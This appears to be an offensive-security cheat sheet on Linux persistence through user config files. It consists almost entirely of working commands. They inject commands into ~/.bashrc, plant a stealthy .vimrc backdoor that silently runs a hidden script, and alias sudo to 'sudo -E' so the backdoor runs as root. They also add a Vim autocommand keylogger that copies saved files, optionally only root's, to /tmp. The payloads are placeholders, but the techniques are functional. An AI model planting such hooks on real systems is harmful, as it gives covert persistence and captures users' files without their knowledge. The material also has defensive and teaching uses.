# User Configuration Files

## Inserting a command into the user's .bashrc file

```bash
# Append a command to the users .bashrc file
echo "touch /tmp/bashtest.txt" >> ~/.bashrc
# Ensure that the file to be created doesn't already exist
ls -al /tmp/bashtest.txt
# Load /bin/bash to force .bashrc file to be run
/bin/bash
# Ensure that the file has been created
ls -al /tmp/bashtest.txt 
```

## VIM Config Simple Backdoor

```bash
# Basic Example
## Create / Edit .vimrc file
vi .vimrc
## Prepend commands with '!' in the .vimrc file this will run the touch command to create a file
!touch /tmp/test.txt
## User runs VIM
vim
## File is created
ls -al /tmp/test.txt

# More Stealthy example
## Clear .vimrc file
echo "" > .vimrc
## Create / Edit .vimrc file
vi .vimrc
## Prepend commands with '!' in the .vimrc file this will run a script
:silent !source ~/.vimrunscript
## Create shell script file
nano .vimrunscript
## Add below contents to the file
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
## User runs VIM
vim
## File is created
ls -al /tmp/hacksrcout.txt

# Add alias for sudo forces sudo to persist users .vimrc file giving the above backdoor root privs if run as sudo
## Add alias
echo 'alias sudo="sudo -E"' >> .bashrc
## Ensure alias changes go into affect straight away
source ~/.bashrc
```

## VIM Config Simple Keylogger

```bash
# Setting an action for our autocommand event
## Create / Edit .vimrc file
echo "" > .vimrc
## Make secondary location to hold command
mkdir -p ~/.vim/plugin
## Edit plugin file
vi ~/.vim/plugin/settings.vim
## Add below contents to plugin file
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
## Run vim on a test file and add some content
vi /tmp/test234.txt
## Read content in output file
cat /tmp/hackedfromvim.txt

# Add ability to only log for sudo
## Update settings.vim file
vi ~/.vim/plugin/settings.vim
## Change contents to match the below
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
## Remove previously created file
rm /tmp/hackedfromvim.txt
## Open VIM as normal user and add some content
vi /tmp/test.txt
## Confirm file was not created
ls -al /tmp/hackedfromvim.txt
## Run VIM as sudo and add some content
sudo vi /tmp/test.txt
## Confirm file was created. 
ls -al /tmp/hackedfromvim.txt 
```
